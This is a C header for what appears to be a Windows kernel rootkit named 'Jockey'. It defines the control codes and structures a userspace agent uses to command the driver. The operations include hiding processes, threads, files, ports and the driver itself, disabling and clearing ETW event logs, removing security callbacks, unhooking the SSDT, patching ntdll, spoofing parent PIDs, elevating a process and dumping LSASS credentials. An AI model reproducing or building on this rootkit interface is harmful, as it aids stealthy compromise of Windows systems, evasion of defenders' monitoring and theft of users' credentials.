/*
 * jockey.h ? shared definitions between kernel driver and userspace agent.
 * Both sides include this header for IOCTL codes and request structures.
 */

#ifndef JOCKEY_H
#define JOCKEY_H

#include <ntddk.h>

/*
 * Magic bytes: 'J' 'K' 'Y'
 * All IOCTLs use METHOD_BUFFERED.
 */

#define JKY_IOCTL_MAGIC          0x4A4B59
#define JKY_DEVICE_NAME          L"\\Device\\Jockey"
#define JKY_SYMLINK_NAME         L"\\DosDevices\\Jockey"
#define JKY_USER_PATH            L"\\\\.\\Jockey"

/* ---- IOCTL codes ---- */

#define JKY_IOCTL_PING \
    CTL_CODE(0x8000, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define JKY_IOCTL_HIDE_PID \
    CTL_CODE(0x8000, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define JKY_IOCTL_UNHIDE_PID \
    CTL_CODE(0x8000, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define JKY_IOCTL_HIDE_FILE \
    CTL_CODE(0x8000, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define JKY_IOCTL_UNHIDE_FILE \
    CTL_CODE(0x8000, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define JKY_IOCTL_GET_ROOT \
    CTL_CODE(0x8000, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define JKY_IOCTL_KILL_PID \
    CTL_CODE(0x8000, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define JKY_IOCTL_DISABLE_ETW \
    CTL_CODE(0x8000, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define JKY_IOCTL_DISABLE_OB_CB \
    CTL_CODE(0x8000, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define JKY_IOCTL_HIDE_DRIVER \
    CTL_CODE(0x8000, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define JKY_IOCTL_PROTECT_MEM \
    CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define JKY_IOCTL_DISABLE_CALLBACKS \
    CTL_CODE(0x8000, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define JKY_IOCTL_HIDE_THREAD \
    CTL_CODE(0x8000, 0x80C, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define JKY_IOCTL_SPOOF_PPID \
    CTL_CODE(0x8000, 0x80D, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define JKY_IOCTL_CLEAR_ETW \
    CTL_CODE(0x8000, 0x80E, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define JKY_IOCTL_DUMP_LSASS \
    CTL_CODE(0x8000, 0x80F, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define JKY_IOCTL_HIDE_PORT \
    CTL_CODE(0x8000, 0x810, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define JKY_IOCTL_PROCESS_SHIELD \
    CTL_CODE(0x8000, 0x811, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define JKY_IOCTL_UNHOOK_SSDT \
    CTL_CODE(0x8000, 0x812, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define JKY_IOCTL_PATCH_NTDLL \
    CTL_CODE(0x8000, 0x813, METHOD_BUFFERED, FILE_ANY_ACCESS)

/* ---- request structures ---- */

#define JKY_MAX_PATH_W 260
#define JKY_MAX_HIDDEN_PIDS 256
#define JKY_MAX_HIDDEN_FILES 256

struct jky_req_pid {
    ULONG pid;
    ULONG flags;
};

struct jky_req_file {
    wchar_t path[JKY_MAX_PATH_W];
    ULONG flags;
};

struct jky_req_root {
    ULONG target_pid;
    ULONG flags;
};

struct jky_req_kill {
    ULONG pid;
    ULONG exit_code;
};

struct jky_req_thread {
    ULONG tid;
    ULONG flags;
};

struct jky_req_ppid {
    ULONG child_pid;
    ULONG new_ppid;
};

struct jky_req_port {
    USHORT port;
    USHORT protocol; /* 0 = TCP, 1 = UDP */
    ULONG flags;
};

struct jky_req_shield {
    ULONG pid;
    ULONG level;
};

struct jky_req_lsass {
    ULONG pid;
    ULONG64 output_buffer;
    ULONG buffer_size;
};

struct jky_req_generic {
    ULONG pid;
    ULONG64 addr;
    ULONG64 size;
    ULONG flags;
};

/* ---- driver internal structures ---- */

struct jky_hidden_pid {
    struct jky_hidden_pid *next;
    struct jky_hidden_pid *prev;
    ULONG pid;
    ULONG64 active_links_flink;
    ULONG64 active_links_blink;
};

struct jky_hidden_file {
    struct jky_hidden_file *next;
    wchar_t path[JKY_MAX_PATH_W];
};

struct jky_hidden_thread {
    struct jky_hidden_thread *next;
    ULONG tid;
    ULONG64 thread_list_flink;
    ULONG64 thread_list_blink;
};

/* ---- shared globals (defined in jockey_km.c) ---- */
extern struct jky_hidden_pid  *g_hidden_pids;
extern struct jky_hidden_file *g_hidden_files;
extern struct jky_hidden_thread *g_hidden_threads;
extern FAST_MUTEX g_list_lock;

#endif /* JOCKEY_H */
